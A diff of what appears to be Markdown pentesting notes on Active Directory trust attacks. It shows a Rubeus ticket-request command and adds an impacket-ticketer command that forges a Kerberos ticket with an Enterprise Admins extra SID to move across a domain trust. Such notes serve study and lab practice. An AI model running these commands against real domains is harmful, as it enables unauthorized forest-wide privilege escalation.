@@ -114,6 +114,12 @@ and use it to ask for a tgt
 <pre data-overflow="wrap"><code><strong>C:\AD\Tools\Rubeus.exe asktgs /service:&#x3C;$service> /dc:&#x3C;$Local DC> /ptt /ticket:&#x3C;$Ticket>
 </strong></code></pre>
 
-<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(35).png" alt=""><figcaption></figcaption></figure>
+#### Another method for inter realm
 
-\
+{% code overflow="wrap" %}
+```
+impacket-ticketer -aesKey <aes> -domain-sid <Actual domain sid> -domain <actual domain> -extra-sid <other domain sid-519> administrator -extra-pac
+```
+{% endcode %}
+
+make sure to modify /etc/hosts
